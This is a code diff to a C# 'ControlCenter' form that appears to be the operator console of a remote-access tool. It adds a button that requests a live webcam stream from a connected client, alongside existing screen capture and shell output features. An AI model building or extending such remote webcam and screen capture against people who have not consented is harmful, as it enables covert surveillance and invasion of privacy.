@@ -83,6 +83,7 @@ namespace ControlCenter
         {
             ScreenCapture.Enabled = false;
             ShellOutput.AppendText("Requesting Screen Capture..." + Environment.NewLine);
+            if (display != null) display.Close();
             display = new Screen();
             display.Show();
             Task.Run(() =>
@@ -97,6 +98,31 @@ namespace ControlCenter
                 else
                 {
                     ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Screen Capture Failed!" + Environment.NewLine); }));
+                    Client = null;
+                }
+            });
+        }
+
+        private void Webcam_Click(object sender, EventArgs e)
+        {
+            Webcam.Enabled = false;
+            ShellOutput.AppendText("Requesting Webcam..." + Environment.NewLine);
+            if (display != null) display.Close();
+            display = new Screen();
+            display.IsStreaming = true;
+            display.Show();
+            Task.Run(() =>
+            {
+                Client = WebcamHandler.Request(ShellPrefix.Text);
+                ShellButton.Invoke(new MethodInvoker(() => { Webcam.Enabled = true; }));
+                if (Client != null && Client.Connected)
+                {
+                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Webcam Successful!" + Environment.NewLine); }));
+                    display.Client = Client;
+                }
+                else
+                {
+                    ShellOutput.Invoke(new MethodInvoker(() => { ShellOutput.AppendText("Webcam Failed!" + Environment.NewLine); }));
                     Client = null;
                 }
             });
